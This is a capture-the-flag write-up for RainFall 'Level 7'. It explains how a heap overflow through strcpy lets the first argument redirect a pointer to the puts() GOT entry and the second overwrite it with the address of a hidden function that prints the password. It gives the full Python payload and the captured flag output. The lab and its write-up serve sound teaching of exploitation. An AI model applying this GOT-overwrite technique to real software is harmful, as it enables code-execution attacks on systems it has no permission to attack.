# Level 7

## Analysis

In the decomp we can notice three elements; a non called function `m()`, a struct `struct_0` which contains an `unsigned int` and a `char *`, and a global called `c`.

`c` is used to store the password read from the pass file (`fgets()` in the main). `m()` prints the content of `c`.

## Finding the malloc addresses

In the main, two `struct_0` are allocated from malloc, then their buffer are also allocated:

```c
struct_0 *v0;  // [bp-0xc]
struct_0 *v1;  // [bp-0x8]

v1 = malloc(8);
v1->field_0 = 1;
v1->field_4 = malloc(8);
v0 = malloc(8);
v0->field_0 = 2;
v0->field_4 = malloc(8);
```

Using gdb, we can retreive their memory addresses as such:

```bash
(gdb) b *main+21
Breakpoint 1 at 0x8048536
(gdb) b *main+47
Breakpoint 2 at 0x8048550
(gdb) b *main+68
Breakpoint 3 at 0x8048565
(gdb) b *main+94
Breakpoint 4 at 0x804857f
(gdb) r l l 
Starting program: /home/user/level7/level7 l l

Breakpoint 1, 0x08048536 in main ()
(gdb) x/x $eax 
0x804a008:	0x00000000
(gdb) s       
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x08048550 in main ()
(gdb) x/x $eax
0x804a018:	0x00000000
(gdb) s       
Single stepping until exit from function main,
which has no line number information.

Breakpoint 3, 0x08048565 in main ()
(gdb) x/x $eax
0x804a028:	0x00000000
(gdb) s       
Single stepping until exit from function main,
which has no line number information.

Breakpoint 4, 0x0804857f in main ()
(gdb) x/x $eax
0x804a038:	0x00000000
```

From that, we can assume that:

```
v1             = 0x804a008 -> Not useful
v1->field_4    = 0x804a018
v0             = 0x804a028
v0->field_4    = 0x804a038 -> Not useful
```

## The strcpy calls

After allocating all this stuff, the buffer are used to store our arguments using `strcpy()`

```c
strcpy(v1->field_4, a1[1]);
strcpy(v0->field_4, a1[2]);
```

`v1` being located lower in the memory, oveflowing the first `strcpy()` call will write in the `v0` area.

## puts@plt

Since we cannot modify neither `fopen()` which reads the password, nor `fgets()` which stores the password into `c`, the only input we have is `puts()`.

We can get its GOT address using: 

```bash
level7@RainFall:~$ objdump -R level7 

level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

Giving us: `08049928`

### Quick GOT reminder

The GOT entry for `puts()` holds the address to the `puts()` function in the libc. In this case:
`08049928 R_386_JUMP_SLOT   puts`

`08049928` holds the address to the libs function, hence why changing this address can make it execute whatever function we want!

# Exploit
```
+---------------------------------------+
|   v1                      *sizeof(8)  |
|   v1->field_0 (uint)      sizeof(4)   |
|   v1->field_4 (char *)    *sizeof(8)  | 0x804a018  ^
+---------------------------------------+            | = 16
|   v0                      *sizeof(8)  | 0x804a028  V
|   v0->field_0 (uint)      sizeof(4)   |            + = 4
|   v0->field_4 (char *)    *sizeof(8)  | 0x804a02c  ↳ 20 from `v1->field_4`           
+---------------------------------------+
```
Here's how our structs layout is structured, what we want to do is write a new memory address (`m()`) at the address of `puts()`.
Here's how:

We will use the first `strcpy()` to make `v0->field_4` point to the `puts()` GOT entry, then using the second `strcpy()` we will be able to overwrite the address at this pointer to `m()`.

To do that we need to find the right offset for the first buffer, either through brute force, or we can use the offset we got from the malloc return addr:

We have 16 bytes between `v1->field_4` and `v0`, now we need to add the 4 bytes of the uint which gives us 20 bytes.
So we need to replace the address 20 bytes after our buffer!!

If we put the address of the `puts()` GOT entry after the 20 filler, v0->field_4 will now point to the GOT entry.

Using the second argument, `strcpy()` will now write to the GOT entry, if we pass another address, for example the one from `m()`, it will replace the entry with our function.

Then when `puts()` gets executed, it will instead execute `m()`!

## Our payload

It will consist of the following:

First argument:
`[20 filler to get to the v0->field_4 addr] + [`puts()` GOT addr]`

This will setup the address we want to overwrite with the second argument:
`[addr of `m()`]`

<details>
    <summary>Spoiler</summary>

First payload:
```bash
first_arg=$(python -c "print'A' * 20 + '\x28\x99\x04\x08'")
```

Second:
```bash
second_arg=$(python -c "print'\xF4\x84\x04\x08'")
```

## Results

```bash
level7@RainFall:~$ first_arg=$(python -c "print'A' * 20 + '\x28\x99\x04\x08'")
level7@RainFall:~$ second_arg=$(python -c "print'\xF4\x84\x04\x08'")          
level7@RainFall:~$ ./level7 $first_arg $second_arg 
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1748700560
level7@RainFall:~$ 
```

</details>